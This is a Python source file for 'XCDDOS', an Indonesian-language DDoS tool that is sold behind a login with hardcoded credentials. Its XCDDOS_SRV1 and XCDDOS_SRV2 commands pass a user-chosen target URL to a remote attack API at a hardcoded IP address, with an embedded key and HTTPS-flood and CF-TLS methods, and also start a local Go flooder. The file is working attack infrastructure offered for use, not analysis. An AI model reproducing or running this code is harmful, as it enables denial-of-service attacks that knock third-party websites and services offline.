# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[0;33m' #KUNING
P = '\033[0;94m' #BIRU
srv = '5'

def XC():
	os.system ("clear")
	print("""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 


\033[37m[ XC ]
\033[0;33mUntuk Waktu sudah di sesuaiin sama Creater untuk menghindari Suspended Api Server agar server berjalan dengan sempurna kedepannya maka patuhi saja peraturannya!

                ⚠️Tolong Jangan Spam Method!⚠️
• Contohnya setelah penyerangan belum selesai di timpa method lagi
Ini akan menyebabkan Vps yang kalian pakai akan mengalami suspen karena sistem kami menggunakan fitur deteksi spam!
• Jika menggunakan termux maka Key akan di take down otomatis oleh sistem!
• Semisal penyerangan 90 detik maka tunggu waktu selesai baru bisa melakukan penyerangan ulang!
• Usahakan sebelum melakukan serangan ulang ketik STOP terlebih dahulu agar server dapat di refresh!

     ☢️Server Online \033[0;94m5
          ☢️Concurent \033[0;94m1



\033[0;33mL7 XCDDOS 


\033[37m🔥 XCDDOS_SRV1 [URL]

\033[37m🔥 XCDDOS_SRV2 [URL]



""")

def KILL():
	os.system ("clear")
	print("""
                     __  ___              ____ _             
                     \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
                      \  /| | '_ \| '_ \| |   | |/ _` | | | |
                      /  \| | | | | | | | |___| | (_| | |_| |
                     /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                                       |___/ 
\033[32m                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⣠⠒⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠞⠋⠉⠀⠀⠀⠀ ⠀
                        ⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⣿⠂⠀⠀⠀⠀⣀⠄⡴⢈⣤⣎⠴⡏⠀⣀⠄⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⣿⠃⠀⠀⠀⡞⠀⣼⣽⣷⡿⡣⣾⣿⣶⣿⣶⡶⠖⠄⠂⠀⠀⠀ 
                        ⠀⠀⢠⠀⢸⣿⠀⠀⠀⢀⢹⣆⢀⣀⠀⣆⣾⣻⢞⡿⣺⣿⡿⠿⠛⠛⠻⢿⣿⣶⣄⠀⠀⠀ 
                        ⠀⠀⣯⠀⠘⣼⢢⣰⣇⣼⣾⣯⢹⢿⣶⣿⡿⣱⣿⡥⠃⣁⠤⣤⡤⡀⠀⠀⠈⣿⠏⠀⠀⠀ 
                        ⠀⠀⠸⣧⡀⣹⣬⢿⡟⢿⢿⠿⣿⢻⡅⣾⣾⣏⡎⡴⠊⣀⠀⢈⣿⣾⠂⠀⢰⠿⠀⠀⠀⠀ 
                        ⠀⠀⠀⠙⢿⣺⡜⢸⣿⣿⢘⡶⢵⣿⡿⣸⢿⣷⣞⣗⣺⣟⣿⠯⡶⠊⠀⣠⣣⠃⠀⠀⠀⠀ 
                        ⠀⠀⠀⠐⠦⢛⠿⣾⣿⣛⣾⣶⣿⢿⣿⡛⣯⣽⣻⣿⡟⢿⣳⠟⠁⢀⣞⡕⠁⠀⠀⠀⠀⠀ 
                        ⠀⠀⢠⠀⠀⡀⠳⣾⣿⣿⡿⣿⣷⣽⣯⣶⠾⢿⣿⣽⠼⠊⠀⢀⣴⡿⠽⠩⣇⣄⠀⠀⠀⠀ 
                        ⠀⠀⢠⣷⣸⣿⣇⡈⣿⣿⣿⣿⣿⣻⣞⣿⠟⠋⠉⠙⠀⢀⣴⢹⣿⣷⢿⣛⡏⠉⠀⠀⠀⠀ 
                        ⠀⠀⣾⣯⠛⠸⣞⣻⣯⢽⣴⣿⡟⣿⢹⡏⠀⢀⣤⠀⣴⣻⢿⣿⣿⡋⢤⠗⠀⠀⠀⠀⠀⠀ 
                        ⢀⡀⠘⣿⡷⠋⠀⠻⢼⣟⠟⠃⢹⣿⣿⠀⢸⡿⠃⣾⣿⣿⢸⢽⣿⠛⠉⠀⡀⣤⡤⠂⠀⠀ 
                        ⠸⣙⠤⡞⠀⠀⠀⡠⠔⠒⠂⢤⡘⠙⣻⠀⠘⣷⢰⢿⣟⣺⣟⣊⠉⢠⠤⣾⠞⡽⠧⢤⣀⡀ 
                        ⠀⡯⣦⠁⠀⠀⣾⠀⠀⠀⠀⠀⣈⣲⣾⠀⠀⠈⠺⡾⣍⣫⠙⡳⣷⣏⠞⠉⠁⠈⠑⡽⡆⠀ 
                        ⠀⠹⣦⡀⠀⠀⡿⣦⣄⣠⣴⠟⠉⠀⠈⡄⠀⠀⠀⠙⠮⣏⣙⠿⠓⠁⠀⠀⢀⣀⣀⣷⡇⠀ 
                        ⠀⠀⠙⣧⡀⠀⠘⠾⠾⠼⠋⠀⠀⠀⠀⣸⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠃⠀⠐⣱⠁⠀ 
                        ⠀⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⢿⡟⠢⠤⣀⣀⣀⣀⣤⣚⣶⠤⣤⡤⠚⠁⠀⠀ 
                        ⠀⠀⠀⠠⢔⣲⠿⠗⢲⣴⢶⣚⡩⠄⣱⡼⣮⡇⠀⠀⣀⠬⢻⢗⣟⣿⣵⠶⣳⠾⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠘⠢⠜⠋⢺⠏⠐⠪⠭⣙⣭⣟⡿⠷⣊⡱⢠⢾⡞⠚⠉⠛⠉⠁⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⣔⢓⣒⣉⠩⣭⣟⠋⣿⣏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣏⠋⡿⠚⠉⠉⠀ 
                                                       
\033[37m                        [STATUS] DDoS BERHASIL DI STOP!
\033[0;33m                            SERANGAN DDOS SELESAI!
\033[37m                        DAN TERMINAL BERHASIL DI REFRESH!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                USER     : \033[0;33m[ \033[032mXCDDOS \033[0;33m]
\033[0;94m                CREATOR  : \033[0;33m[ \033[032mXinnClay Fixxed \033[0;33m]
\033[0;94m                TELE     : \033[0;33m[ \033[32m@XinnClay_Fixxed \033[0;33m]
\033[0;94m                CHANNELS : \033[0;33m[ \033[32mhttps://t.me/XinnClayFixxed \033[0;33m]
\033[0;94m                YOUTUBE  : \033[0;33m[ \033[32mhttps://youtube.com/@xinnclay \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh XinnClay XCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
\033[1;36m
\033[37m                            ➲                   TYPE:
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                LS     : \033[0;33m[ \033[032mTO SEE ALL METHOD LIST \033[0;33m]
\033[0;94m                XC     : \033[0;33m[ \033[32mTO VIEW AND USE SPECIAL XCDDOS \033[0;33m]
╚════════════════════════════════════════════════════════╝
""")



def main():


	while True:
		sys.stdout.write(f"\x1b]2;[/] XCDDOS :: Server Online {srv} :: Running: {srv}/{srv}\x07")
		sin = input("\033[0;30;45mXCDDOS\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			XC()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			KILL()
		if sinput == "back" or sinput == "BACK":
			os.system ("clear")
			XC()
		if sinput == "xc" or sinput == "XC":
			XC()
		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			XC()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			XC()
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			XC()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == "LS" or sinput == ".ls" or sinput == "ls" or sinput == ".LS" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			XC()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########L7 XC API########
		elif sinput == "xcddos_srv1" or sinput == "XCDDOS_SRV1":
			try:
				url = sin.split()[1]
				xin = requests.get(f'http://128.199.233.29:3000/api/attack?key=ngocphong0311&url={url}&port=443&time=60&method=PHONG_HTTPS-FLOOD')
				os.system(f'go run XCDDOS.go -url {url} GET')
				os.system ("clear")
				print(f"""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
\033[0;33m ⚠️[INFO] {xin}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m UNLIMITED \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mXCDDOS_SRV1 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mBASIC \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh XinnClay XCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api By XCDDOS
""")

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "xcddos_srv2" or sinput == "XCDDOS_SRV2":
			try:
				url = sin.split()[1]
				xin = requests.get(f'http://128.199.233.29:3000/api/attack?key=ngocphong0311&url={url}&port=443&time=60&method=PHONG_CF-TLS')
				os.system(f'go run XCDDOS.go -url {url} GET')
				os.system ("clear")
				print(f"""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
\033[0;33m ⚠️[INFO] {xin}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m UNLIMITED \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mXCDDOS_SRV2 \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mBASIC \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh XinnClay XCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api By XCDDOS
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = "mkra"
    passwd = "mkra"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO XCDDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""☠️ \033[1;31;40mPW SALAH BELI DULU !!!🚫\nTELEGRAM: @XinnClay_Fixxed""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO XCDDOS TOOLS""")
        time.sleep(0.3)
    XC()
    main()
    

login()
